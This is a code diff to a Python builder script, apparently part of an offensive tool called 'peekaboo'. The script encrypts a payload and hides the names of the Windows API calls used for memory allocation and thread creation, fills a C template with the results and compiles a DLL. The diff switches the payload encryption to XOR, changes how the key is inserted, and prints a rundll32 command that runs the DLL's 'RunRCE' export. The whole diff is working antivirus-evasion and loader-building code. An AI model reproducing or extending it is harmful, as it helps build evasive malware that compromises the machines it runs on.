@@ -81,7 +81,8 @@ def run_peekaboo():
     f_wfso = "WaitForSingleObject"
 
     print (Colors.BLUE + "encrypt..." + Colors.ENDC)
-    ciphertext, p_key = encryptor.aes_encrypt(plaintext)
+    # ciphertext, p_key = encryptor.aes_encrypt(plaintext)
+    ciphertext, p_key = encryptor.xor_encrypt(plaintext)
     ciphertext_va, va_key = encryptor.xor_encrypt(f_va)
     ciphertext_vp, vp_key = encryptor.xor_encrypt(f_vp)
     ciphertext_cth, ct_key = encryptor.xor_encrypt(f_cth)
@@ -96,7 +97,8 @@ def run_peekaboo():
     data = data.replace('unsigned char s_ct[] = { };', 'unsigned char s_ct[] = ' + ciphertext_cth)
     data = data.replace('unsigned char s_wfso[] = { };', 'unsigned char s_wfso[] = ' + ciphertext_wfso)
 
-    data = data.replace('char my_payload_key[] = { }', 'char my_payload_key[] = ' + p_key)
+    # data = data.replace('char my_payload_key[] = { };', 'char my_payload_key[] = ' + p_key)
+    data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
     data = data.replace('char f_key[] = "";', 'char f_key[] = "' + va_key + '";')
 
     tmp.close()
@@ -109,6 +111,9 @@ def run_peekaboo():
     except:
         print (Colors.RED + "error compiling template :(" + Colors.ENDC)
         sys.exit()
+    else:
+        print (Colors.GREEN + "successfully compiled :)" + Colors.ENDC)
+        print (Colors.GREEN + "rundll32 .\peekaboo.dll, RunRCE")
 
 if __name__ == "__main__":
     run_peekaboo()
